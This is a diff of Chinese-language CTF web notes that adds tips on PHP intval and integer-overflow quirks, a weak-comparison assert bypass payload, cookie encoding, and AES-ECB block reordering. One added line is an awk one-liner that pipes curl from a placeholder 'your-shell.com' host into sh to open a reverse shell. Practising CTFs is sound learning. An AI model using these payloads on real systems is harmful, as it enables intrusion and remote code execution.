@@ -79,7 +79,7 @@ for i in range(300,1000):
 2.  php md5相关特性。
 - md5原始二进制利用+0e绕过md5弱等于+数组绕过md5强等于：[Easy MD5](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/Easy%20MD5.md)。
 - 一个0e开头且其md5值也是0e开头的字符串，可用于弱等于：`0e215962017`
-1.  php 5 intval特性：[[WUSTCTF2020]朴实无华](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E.md)
+1.  php 5 intval特性：intval会截断科学计数法下的字符串，但当以科学计数法表示的字符串进行运算后便不会截断，会返回其运算后的值。例题：[[WUSTCTF2020]朴实无华](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BWUSTCTF2020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E.md)
 2.  githacker基本命令
 - githacker --url http://example.com/.git --output-folder ./output
 
@@ -711,7 +711,7 @@ const checkmd5Regex = (token: string) => {
 if($count[]=1)
 ```
 
-表示给\$count[]数组末尾添加一个1，如果添加成功返回1，否则0。这个可以用php的整形溢出绕过。如果数组里已有9223372036854775807个元素，末尾再增添元素就会整形溢出，导致返回false。
+表示给\$count[]数组末尾添加一个1，如果添加成功返回1，否则0。这个可以用php的整形溢出绕过。如果数组里已有9223372036854775807个元素，末尾再增添元素就会整形溢出，导致返回false。此为“使用数组整型溢出绕过赋值式“永真”判断”。
 
 135. 攻击 [php-fpm](https://tttang.com/archive/1775/) /pfsockopen绕过 disable_functions+[SUID提权](https://tttang.com/archive/1793/#toc_find-exec)。例题:[[蓝帽杯 2021]One Pointer PHP](https://blog.csdn.net/cosmoslin/article/details/121332240)
 136. [利用pearcmd.php从LFI到getshell](https://blog.csdn.net/rfrder/article/details/121042290)。例题:[[HXBCTF 2021]easywill](https://cn-sec.com/archives/1478076.html)。提供p神的另一篇[文章](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)。
@@ -1103,3 +1103,35 @@ nc -lv 7777
 - Traefik会自动将url里的`;`替换为`&`。
 - chrome puppteer不仅可以访问普通的url，还可以访问`javascript:代码`,`file:///`等协议。并且还可以使用正常浏览器的保存文件等功能。
 - chrome对于file scheme有严格的保护机制。对于 fetch 等直接获取信息的东西，无法跨域。并且 file 处于特殊的地方，它和 data 一样都是以 null 作为 origin 并且不能互相访问。如果外部访问 file 的内容会被 chrome 阻止。也就是说，不能用任何 file 之外的东西直接获取 file 的内容，连 open 和 iframe 都不能访问到 file。但file 访问 file 的时候是不受这个限制的。需要注意的是从 file 访问 file 的时候，不能用跨域直接获取信息的方法，例如 fetch 和 open 的返回对象。但是 open 和 iframe 是可以正常用的。
+177. [web签到](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#BEM2dgiACoGmg4x4jKXcJ6kGnQf)
+- php中的数组可以直接赋值：
+```php
+$a[1][2][3][4]='b';
+echo $a[1][2][3][4];
+//输出b
+```
+- 如cookie名/内容带中文，需要转换编码再发送。
+```python
+cookie={"测试:".encode('utf-8').decode("latin-1"):'a'}
+```
+178. 下面的代码可以用+连接绕过。
+
+```php
+<?php
+highlight_file(__FILE__); 
+include "flag.php";  
+if (isset($_GET['num'])){
+     if ($_GET['num'] == 114514 && check($_GET['num'])){
+              assert("intval($_GET[num])==1919810") or die());
+              echo $flag;
+     } 
+} 
+
+function check($str){
+  return !preg_match("/[a-z]|\;|\(|\)/",$str);
+}
+//payload:?num=114514%2b1805296
+```
+179. 假设只能使用长度为3个字符以内的命令，但参数不限制，就可以用[awk](https://wangchujiang.com/linux-command/c/awk.html)命令反弹shell。`awk '{system("curl https://your-shell.com/ip:port|sh")}'`
+180. php也有整型溢出。例题:[茶歇区](https://blog.csdn.net/miuzzx/article/details/127830557#t16)
+181. AES的ECB模式下，一组密文对应一组明文，也就是说，可以通过改变密文的顺序从而改变解密后明文的顺序。甚至说，可以自己移除某一段密文，只要解密后的明文有效就行。例题:[龙珠NFT](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh)
